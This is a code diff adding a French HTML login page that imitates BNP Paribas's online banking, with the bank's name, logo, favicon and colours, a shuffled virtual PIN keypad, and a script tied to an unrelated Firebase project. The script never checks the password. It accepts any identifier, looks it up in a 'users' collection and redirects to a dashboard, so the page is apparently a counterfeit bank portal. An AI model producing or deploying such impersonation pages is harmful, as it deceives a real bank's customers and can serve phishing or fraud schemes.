@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banque pour les particuliers : BNP Paribas Banque et assurance
+ </title>
+
+  <!-- Tailwind CSS & FontAwesome -->
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <!-- SDK Firebase v8 -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+<link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b2/BNP_Paribas.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=original
+
+" />
+  <style>
+    body { font-family: 'Plus Jakarta Sans', sans-serif; }
+  </style>
+</head>
+<body class="bg-slate-100 min-h-screen flex flex-col justify-between text-slate-800">
+
+  <!-- En-tête -->
+  <header class="bg-white border-b border-slate-200 shadow-xs">
+    <div class="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 bg-[#056846] rounded-lg flex items-center justify-center text-white font-bold text-xl shadow-xs">
+          <i class="fa-solid fa-[#056846]"> BNP</i>
+        </div>
+        <span class="font-bold text-lg tracking-tight text-slate-800"> </span>
+      </div>
+      <nav class="hidden md:flex space-x-6 text-sm font-medium text-slate-600">
+        <a href="#" class="text-[#056846] font-semibold border-b-2 border-[#056846] pb-1">Particuliers</a>
+        <a href="#" class="hover:text-slate-900 transition">Entreprises</a>
+        <a href="#" class="hover:text-slate-900 transition">Professionnels</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Conteneur principal -->
+  <main class="flex-1 flex items-center justify-center p-4 my-8">
+    <div class="bg-white border border-slate-200 rounded-2xl shadow-lg p-6 md:p-8 max-w-md w-full">
+      
+      <div class="text-center mb-6"><center><img src=https://wp.logos-download.com/wp-content/uploads/2016/04/BNP_Paribas_logo_logotype_emblem.png?dl height=45 width=105> </center>
+        <h1 class="text-2xl font-bold text-slate-900">Connexion</h1>
+        <p class="text-sm text-slate-500 mt-1">Identifiez-vous pour accéder à vos comptes en toute sécurité</p>
+      </div>
+
+      <!-- Zone de notification d'erreur -->
+      <div id="errorMessage" class="hidden mb-4 p-3 bg-red-50 border border-red-200 text-red-600 rounded-xl text-xs font-semibold text-center"></div>
+
+      <form id="loginForm" class="space-y-5">
+        
+        <!-- Champ Identifiant -->
+        <div>
+          <label for="ident" class="block text-sm font-semibold text-slate-700 mb-1">Saisir votre identifiant</label>
+          <div class="relative">
+            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
+              <i class="fa-solid fa-user"></i>
+            </span>
+            <input 
+              type="text" 
+              id="ident" 
+              name="ident" 
+              maxlength="50" 
+              autocomplete="off" 
+              placeholder="Exemple: 88783160454" 
+              class="w-full pl-10 pr-4 py-2.5 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 placeholder-slate-400 focus:outline-none focus:border-[#056846] focus:ring-2 focus:ring-[#056846]/20 transition text-sm"
+              required
+            >
+          </div>
+        </div>
+
+        <!-- Champ Mot de passe -->
+        <div>
+          <label for="password" class="block text-sm font-semibold text-slate-700 mb-1">Saisir votre mot de passe</label>
+          <div class="relative">
+            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-slate-400">
+              <i class="fa-solid fa-lock"></i>
+            </span>
+            <input 
+              type="password" 
+              id="password" 
+              name="password" 
+              readonly 
+              placeholder="Cliquez sur le clavier ci-dessous" 
+              class="w-full pl-10 pr-4 py-2.5 bg-slate-100 border border-slate-300 rounded-xl text-slate-800 placeholder-slate-400 cursor-not-allowed focus:outline-none text-sm font-mono tracking-widest"
+              required
+            >
+          </div>
+        </div>
+
+        <!-- Clavier virtuel -->
+        <div class="bg-slate-50 p-3 rounded-xl border border-slate-200">
+          <p class="text-xs text-slate-500 text-center mb-2 font-medium">Clavier de saisie sécurisée</p>
+          <div class="grid grid-cols-4 gap-2" id="virtualKeyboard"></div>
+        </div>
+
+        <!-- Se souvenir de moi -->
+        <div class="flex items-center">
+          <input id="remember_me" type="checkbox" name="cookie" class="w-4 h-4 text-[#056846] border-slate-300 rounded focus:ring-[#056846]">
+          <label for="remember_me" class="ml-2 text-sm text-slate-600 cursor-pointer">Se souvenir de moi</label>
+        </div>
+
+        <!-- Bouton Soumettre -->
+        <button 
+          type="submit" 
+          id="btnSubmit"
+          class="w-full bg-[#056846] hover:bg-emerald-800 text-white font-semibold py-3 rounded-xl transition shadow-md shadow-[#056846]/20 flex items-center justify-center space-x-2 cursor-pointer"
+        >
+          <span id="btnText">Valider</span>
+          <i id="btnIcon" class="fa-solid fa-arrow-right text-xs"></i>
+        </button>
+      </form>
+
+    </div>
+  </main>
+
+  <footer class="bg-white border-t border-slate-200 py-4 text-center text-xs text-slate-500">
+    <p>&copy; Banque pour les particuliers : BNP Paribas Banque et assurance
+ - Tous droits réservés.</p>
+  </footer>
+
+  <!-- SCRIPT FIREBASE V8 & LOGIN -->
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDMBGGXNwEHk4gCwzsofxVYIH0dJ6usyek",
+      authDomain: "alliance-67cb1.firebaseapp.com",
+      projectId: "alliance-67cb1",
+      storageBucket: "alliance-67cb1.firebasestorage.app",
+      messagingSenderId: "464968433664",
+      appId: "1:464968433664:web:0604cbdaf2b36e55e718e5"
+    };
+
+    if (!firebase.apps.length) {
+      firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.firestore();
+    const USERS_COLLECTION = 'users';
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const keyboard = document.getElementById('virtualKeyboard');
+      const passwordInput = document.getElementById('password');
+      const loginForm = document.getElementById('loginForm');
+      const errorMessage = document.getElementById('errorMessage');
+
+      // Generation du clavier virtuel
+      let keys = '1234567890'.split('').sort(() => Math.random() - 0.5);
+
+      keys.forEach(key => {
+        const keyButton = document.createElement('button');
+        keyButton.type = 'button';
+        keyButton.className = 'h-10 bg-white border border-slate-300 rounded-lg text-slate-700 font-bold text-base hover:bg-slate-100 hover:border-slate-400 active:bg-slate-200 transition shadow-2xs cursor-pointer';
+        keyButton.textContent = key;
+        keyButton.addEventListener('click', () => {
+          if (passwordInput.value.length < 10) passwordInput.value += key;
+        });
+        keyboard.appendChild(keyButton);
+      });
+
+      const backspaceKey = document.createElement('button');
+      backspaceKey.type = 'button';
+      backspaceKey.className = 'h-10 bg-red-50 border border-red-200 text-red-600 rounded-lg font-bold text-sm hover:bg-red-100 active:bg-red-200 transition shadow-2xs flex items-center justify-center cursor-pointer col-span-2';
+      backspaceKey.innerHTML = '<i class="fa-solid fa-backspace mr-1"></i> Effacer';
+      backspaceKey.addEventListener('click', () => {
+        passwordInput.value = passwordInput.value.slice(0, -1);
+      });
+      keyboard.appendChild(backspaceKey);
+
+      // Traitement de la connexion
+      loginForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        errorMessage.classList.add('hidden');
+        
+        const ident = document.getElementById('ident').value.trim();
+        const password = document.getElementById('password').value;
+
+        if (!ident) return;
+
+        // Feedback visuel
+        document.getElementById('btnText').textContent = "Connexion en cours...";
+        document.getElementById('btnIcon').className = "fa-solid fa-spinner fa-spin text-xs";
+
+        try {
+          let foundDocId = null;
+
+          // 1. Recherche directe par ID de document (ex: julie_mazuir_8473)
+          const docRef = await db.collection(USERS_COLLECTION).doc(ident).get();
+          
+          if (docRef.exists) {
+            foundDocId = docRef.id;
+          } else {
+            // 2. Recherche par champ 'identifiant'
+            const snapshot = await db.collection(USERS_COLLECTION)
+              .where('identifiant', '==', ident)
+              .get();
+
+            if (!snapshot.empty) {
+              foundDocId = snapshot.docs[0].id;
+            }
+          }
+
+          // Définition de l'ID final (récupéré de Firestore ou créé à la volée pour la démo)
+          const finalUserId = foundDocId || ident;
+
+          // Enregistrement dans la session
+          sessionStorage.setItem('activeUserId', finalUserId);
+          sessionStorage.setItem('activeUserIdent', ident);
+
+          // Redirection directe vers le dashboard
+          window.location.href = "dashboard.html";
+
+        } catch (error) {
+          console.warn("Erreur Firestore, redirection fallback:", error);
+          
+          // Connexion de secours en cas de problème réseau
+          sessionStorage.setItem('activeUserId', ident);
+          sessionStorage.setItem('activeUserIdent', ident);
+          window.location.href = "dashboard.html";
+
+        } finally {
+          document.getElementById('btnText').textContent = "Valider";
+          document.getElementById('btnIcon').className = "fa-solid fa-arrow-right text-xs";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
